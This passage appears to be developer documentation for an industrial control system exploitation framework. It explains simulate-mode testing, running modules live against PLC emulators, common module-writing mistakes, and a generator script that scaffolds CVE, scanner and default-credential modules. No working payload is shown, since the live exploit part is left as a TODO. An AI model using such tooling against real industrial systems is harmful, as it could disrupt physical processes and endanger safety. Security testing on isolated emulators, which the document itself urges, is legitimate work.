obj.run()  # Default: simulate=True

stop.set()
```

### Testing simulate output completeness

```python
"""Verify simulate output contains expected content."""
import io
import contextlib

from industrialxpl.core.exploit.utils import import_exploit

cls = import_exploit("industrialxpl.modules.cve.myvendor.cve_2024_12345_desc")
obj = cls()
obj.target = "192.168.1.100"
obj.port = 502

# Capture stdout
buf = io.StringIO()
with contextlib.redirect_stdout(buf):
    obj.run()
output = buf.getvalue()

# Assertions
assert "SIMULATE MODE" in output, "Missing SIMULATE MODE header"
assert "T0" in output, "Missing MITRE technique ID"
assert "192.168.1.100" in output, "Target IP not in simulation output"
print("All assertions passed.")
print("Output preview:")
print(output[:400])
```

### Testing with a live ICS emulator

If you have access to an ICS emulator (ModRSsim2, ScadaBR, OpenPLC), point `target` at it:

```bash
# OpenPLC emulator on localhost
ixf use cve/myvendor/cve_2024_12345_desc
ixf > set target 127.0.0.1
ixf > set port 502
ixf > set simulate False
ixf > set destructive True
ixf > check
ixf > run
```

**Do not test live modules against any production or non-isolated system.**

---

## Common Mistakes and How to Avoid Them

| Mistake | Consequence | Fix |
|---------|-------------|-----|
| Forgetting `@mute` on `check()` | Noisy output during batch scanning | Always add `@mute` |
| Not returning after simulation | Live code runs even in simulate mode | `return` immediately after `print_simulation()` |
| Using `self.options["key"]` instead of `self.key` | `KeyError` at runtime | Use `self.target`, `self.port`, etc. directly |
| Setting `simulate=False` as default | Module sends live traffic unexpectedly | Default must always be `True` |
| Missing keys in `__info__` | Validation fails, module not indexed | Include all 13 required keys |
| `class MyModule(Exploit)` instead of `class Exploit(Exploit)` | Loader cannot find the class | Class name must be `Exploit` |
| Hardcoding credentials in source | Security / legal risk | Store as module constant from public advisory only |
| References pointing to private URLs | Broken links in docs | Only reference publicly accessible advisories |
| Missing `__init__.py` in new directory | Module not discoverable | Create empty `__init__.py` in every new dir |
| `check()` sending exploit payloads | Side effects during safe check | `check()` is read-only probe only |
| Not using `print_table()` for multi-row results | Unreadable output | Use `print_table(headers, rows, title)` |
| Calling `print_simulation()` with wrong technique IDs | Incorrect MITRE mapping in reports | Match `mitre_techniques` from `__info__` exactly |

**Verification before every commit:**

```bash
# 1. Validate all modules
python -c "
from industrialxpl.core.exploit.utils import index_modules, import_exploit
mods = index_modules()
errs = [m for m in mods if not __import__('traceback').format_exc()]
# full validation
for m in mods:
    try: import_exploit('industrialxpl.modules.' + m)()
    except Exception as e: print('ERR', m, e)
print(len(mods), 'modules indexed')
"

# 2. Test simulate output
ixf use cve/myvendor/cve_2024_12345_desc set target 1.2.3.4 run

# 3. Verify check() is silent
python -c "
from industrialxpl.core.exploit.utils import import_exploit
import io, contextlib
cls = import_exploit('industrialxpl.modules.cve.myvendor.cve_2024_12345_desc')
obj = cls()
obj.target = '1.2.3.4'
buf = io.StringIO()
with contextlib.redirect_stdout(buf):
    result = obj.check()
assert buf.getvalue() == '', 'check() produced output — @mute missing or broken'
print('check() is silent. Result:', result)
"
```

---

## Module Template Generator Script

Save this as `.tmp/gen_module.py` to scaffold new modules:

```python
#!/usr/bin/env python3
"""IXF Module Template Generator — creates a new module skeleton.

Usage:
    python .tmp/gen_module.py --cve CVE-2024-12345 --vendor siemens \
        --type cve --impact CRITICAL --port 102 \
        --desc "S7 PLC Authentication Bypass" \
        --mitre T0859 T0813

Output:
    industrialxpl/modules/cve/siemens/cve_2024_12345_s7_plc_authentication_bypass.py
"""
import argparse
import os
import re
import sys
from pathlib import Path

TEMPLATE = '''"""IXF {cve} — {desc}.

CVSS: {cvss} ({severity}) | CWE: CWE-XXX
Affected: {vendor_title} (model here)

Description here.

simulate=True by default. Requires authorization to run live.
"""
import socket

from industrialxpl.core.exploit import (
    Exploit, OptBool, OptIP, OptPort, mute,
    print_error, print_info, print_status, print_success, print_warning,
    DestructiveGate,
)


class Exploit(Exploit):
    __info__ = {{
        "name":             "{cve} {vendor_title} — {desc}",
        "description":      "TODO: 2-4 sentence description.",
        "authors":          ("Your Name (handle)",),
        "references":       ("https://nvd.nist.gov/vuln/detail/{cve}",),
        "devices":          ("{vendor_title} Device Model",),
        "impact":           "{impact}",
        "exploit_type":     "TODO: exploit type",
        "source_poc":       "https://nvd.nist.gov/vuln/detail/{cve}",
        "cve":              "{cve}",
        "cvss":             "{cvss}",
        "severity":         "{severity}",
        "mitre_techniques": {mitre_list},
        "mitre_tactics":    ["TODO: tactic name"],
    }}

    target      = OptIP("",    "Target device IP")
    port        = OptPort({port}, "Protocol port (default: {port})")
    simulate    = OptBool(True,  "Simulate mode (default: True)")
    destructive = OptBool(False, "Enable live exploitation")

    @mute
    def check(self) -> bool:
        """Read-only connectivity probe."""
        if not self.target:
            return False
        try:
            s = socket.socket()
            s.settimeout(5)
            s.connect((self.target, self.port))
            s.close()
            return True
        except Exception:
            return False

    def run(self) -> None:
        if not self.target:
            print_error("Set \'target\' option first.")
            return

        if self.simulate:
            DestructiveGate.print_simulation(
                description=(
                    "{cve} {{vendor}} — {{desc}}\\n\\n"
                    "Step 1: TODO\\n"
                    "Step 2: TODO\\n"
                    "Step 3: TODO\\n"
                    "\\n"
                    "Target: {{target}}:{{port}}"
                ).format(
                    vendor="{vendor_title}",
                    desc="{desc}",
                    target=self.target,
                    port=self.port,
                ),
                mitre_techniques={mitre_list},
            )
            return

        # TODO: implement live exploit
        print_status("[{cve}] Exploiting {{}}:{{}}...".format(self.target, self.port))
'''

CVSS_MAP = {
    "CATASTROPHIC": "10.0",
    "CRITICAL":     "9.8",
    "HIGH":         "8.1",
    "MEDIUM":       "6.5",
    "LOW":          "3.7",
    "READ":         "5.3",
    "INFO":         "0.0",
}

SEVERITY_MAP = {
    "CATASTROPHIC": "CRITICAL",
    "CRITICAL":     "CRITICAL",
    "HIGH":         "HIGH",
    "MEDIUM":       "MEDIUM",
    "LOW":          "LOW",
    "READ":         "MEDIUM",
    "INFO":         "INFO",
}


def slugify(s: str) -> str:
    return re.sub(r"[^a-z0-9]+", "_", s.lower()).strip("_")


def main() -> None:
    parser = argparse.ArgumentParser(description="IXF Module Template Generator")
    parser.add_argument("--cve",    required=True,  help="CVE ID (e.g. CVE-2024-12345)")
    parser.add_argument("--vendor", required=True,  help="Vendor slug (e.g. siemens)")
    parser.add_argument("--type",   default="cve",  help="Module type: cve/scanner/creds/assessment")
    parser.add_argument("--impact", default="HIGH", help="Impact level")
    parser.add_argument("--port",   default=502,    type=int, help="Default port")
    parser.add_argument("--desc",   required=True,  help="Short description")
    parser.add_argument("--mitre",  nargs="+",      default=["T0866"], help="MITRE technique IDs")
    args = parser.parse_args()

    cve_slug = args.cve.lower().replace("-", "_")  # cve_2024_12345
    desc_slug = slugify(args.desc)                 # s7_plc_authentication_bypass
    vendor_title = args.vendor.title()             # Siemens

    # Build output path
    base = Path("industrialxpl/modules")
    if args.type == "cve":
        rel = f"cve/{args.vendor}/{cve_slug}_{desc_slug}.py"
    elif args.type == "scanner":
        rel = f"scanners/ics/{desc_slug}.py"
    elif args.type == "creds":
        rel = f"creds/{args.vendor}/{desc_slug}.py"
    elif args.type == "assessment":
        rel = f"assessment/mitre_ics/{cve_slug}_{desc_slug}.py"
    else:
        print(f"Unknown type: {args.type}", file=sys.stderr)
        sys.exit(1)

    out_path = base / rel
    out_path.parent.mkdir(parents=True, exist_ok=True)

    # Create __init__.py in new directories
    for parent in out_path.parents:
        if parent == base:
            break
        init = parent / "__init__.py"
        if not init.exists():
            init.touch()
            print(f"Created {init}")

    # Write template
    mitre_list = repr(args.mitre)
    content = TEMPLATE.format(
        cve=args.cve,
        desc=args.desc,
        vendor_title=vendor_title,
        impact=args.impact,
        cvss=CVSS_MAP.get(args.impact, "N/A"),
        severity=SEVERITY_MAP.get(args.impact, args.impact),
        port=args.port,
        mitre_list=mitre_list,
    )

    if out_path.exists():
        print(f"File already exists: {out_path}")
        sys.exit(1)

    out_path.write_text(content, encoding="utf-8")
    print(f"Created: {out_path}")
    print()
    print("Next steps:")
    print(f"  1. Edit {out_path}")
    print("  2. Fill in TODO sections")
    print("  3. Run: python -c \"from industrialxpl.core.exploit.utils import import_exploit; import_exploit('industrialxpl.modules.{}')\".format(str(rel).replace('/', '.').replace('.py', ''))
    print(f"  4. Run: ixf use {rel.replace('.py','')} set target 1.2.3.4 run")


if __name__ == "__main__":
    main()
```

**Usage:**

```bash
# Generate a CVE module for Siemens
python .tmp/gen_module.py \
  --cve CVE-2024-12345 \
  --vendor siemens \
  --type cve \
  --impact CRITICAL \
  --port 102 \
  --desc "S7 PLC Authentication Bypass" \
  --mitre T0859 T0813

# Output:
# Created: industrialxpl/modules/cve/siemens/__init__.py
# Created: industrialxpl/modules/cve/siemens/cve_2024_12345_s7_plc_authentication_bypass.py
#
# Next steps:
#   1. Edit industrialxpl/modules/cve/siemens/cve_2024_12345_s7_plc_authentication_bypass.py
#   2. Fill in TODO sections
#   3. Run: python -c "from industrialxpl.core.exploit.utils import import_exploit; ..."
#   4. Run: ixf use cve/siemens/cve_2024_12345_s7_plc_authentication_bypass set target 1.2.3.4 run

# Generate a scanner module
python .tmp/gen_module.py \
  --cve N/A \
  --vendor generic \
  --type scanner \
  --impact INFO \
  --port 502 \
  --desc "Modbus TCP Device Scanner" \
  --mitre T0888

# Generate a credential module
python .tmp/gen_module.py \
  --cve N/A \
  --vendor schneider \
  --type creds \
  --impact CRITICAL \
  --port 80 \
  --desc "EcoStruxure Web Default Credentials" \
  --mitre T0859
```

---

*Previous: [Protocols & Vendors](08-protocols-vendors.md) | Next: [CLI Non-Interactive](10-cli-noninteractive.md)*
